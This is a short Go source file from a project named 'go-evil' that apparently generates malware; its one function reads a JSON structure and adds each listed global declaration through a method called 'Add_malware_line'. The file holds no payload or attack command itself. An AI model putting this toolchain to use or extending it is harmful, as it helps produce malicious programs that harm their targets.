package finalize

import "github.com/TeamPhoneix/go-evil/utility/structure"

func Add_globals(s_json string) string {
	data_object := structure.Receive(s_json)

	if len(data_object.GO_global) > 0 {
		for _, new_global := range data_object.GO_global {
			data_object.Add_malware_line(new_global)
		}
	}

	return structure.Send(data_object)
}
